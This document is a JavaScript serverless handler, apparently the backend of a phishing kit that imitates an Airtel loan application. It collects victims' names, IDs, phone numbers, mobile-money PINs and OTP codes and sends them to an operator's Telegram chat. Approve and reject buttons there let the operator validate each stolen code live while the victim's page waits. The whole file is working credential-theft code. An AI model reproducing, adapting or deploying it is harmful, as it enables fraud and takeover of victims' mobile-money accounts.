globalThis.verificationStore = globalThis.verificationStore || {};

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Vercel settings." });
    }

    // --- 1. WEBSITE CHECKING STATUS ---
    if (req.method === 'GET') {
        const { userId, type } = req.query;
        const key = `${userId}_${type}`;
        const status = globalThis.verificationStore[key] || 'pending';

        if (status !== 'pending') {
            delete globalThis.verificationStore[key];
        }
        return res.status(200).json({ status: status });
    }

    // --- 2. POST REQUESTS (Website or Telegram) ---
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM WEBHOOK (You clicked a button)
            if (body.callback_query) {
                const callback = body.callback_query;
                const [action, userId, type] = callback.data.split('_');

                globalThis.verificationStore[`${userId}_${type}`] = action === 'approve' ? 'approved' : 'rejected';

                const originalText = callback.message.text;
                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>${type} APPROUVÉ</b> - L'utilisateur peut continuer` 
                    : `\n\n❌ <b>${type} REJETÉ</b> - L'utilisateur doit réessayer`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: originalText + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA
            if (body.action === 'send') {
                const { type, userId, data } = body;
                let message = "";
                let keyboard = null;
                const time = new Date().toLocaleString();

                if (type === 'APPLICATION') {
                    message = `📝 <b>NOUVELLE DEMANDE DE PRÊT AIRTEL</b>\n\n`;
                    message += `👤 <b>Nom:</b> ${data.name}\n`;
                    message += `🆔 <b>ID:</b> ${data.id}\n`;
                    message += `💰 <b>Montant:</b> USD ${data.amount}\n`;
                    message += `💼 <b>Revenu:</b> USD ${data.income}\n`;
                    message += `⏱ <b>Heure:</b> ${time}\n`;
                } 
                else if (type === 'PHONE' || type === 'PIN' || type === 'OTP') {
                    const title = type === 'PHONE' ? 'NUMÉRO DE TÉLÉPHONE' : (type === 'PIN' ? 'CODE PIN' : 'CODE OTP');
                    const length = type === 'PHONE' ? '9 chiffres' : '4 chiffres';
                    
                    message = `# Thor - Vérification ${type}\n`;
                    message += `<b>VÉRIFICATION ${title}</b>\n\n`;
                    message += `<b>DÉTAILS:</b>\n`;
                    message += `• ${title}: <code>${data.phone || data.value}</code>\n`;
                    message += `• Username: user_${userId}\n`;
                    message += `• Heure: ${time}\n`;
                    message += `• Bot: user75\n\n`;
                    message += `<b>Vérifier:</b>\n`;
                    message += `• Longueur: ${length}\n`;
                    message += `• Délai: 5 minutes\n`;

                    keyboard = {
                        inline_keyboard: [
                            [
                                { text: `✅ ${type} Correct`, callback_data: `approve_${userId}_${type}` },
                                { text: `❌ ${type} Incorrect`, callback_data: `reject_${userId}_${type}` }
                            ]
                        ]
                    };
                }

                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                };

                if (keyboard) {
                    payload.reply_markup = keyboard;
                }

                const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!tgResponse.ok) {
                    const errData = await tgResponse.json();
                    return res.status(500).json({ error: "Telegram Error: " + errData.description });
                }

                return res.status(200).json({ success: true });
            }

        } catch (error) {
            console.error(error);
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
        }
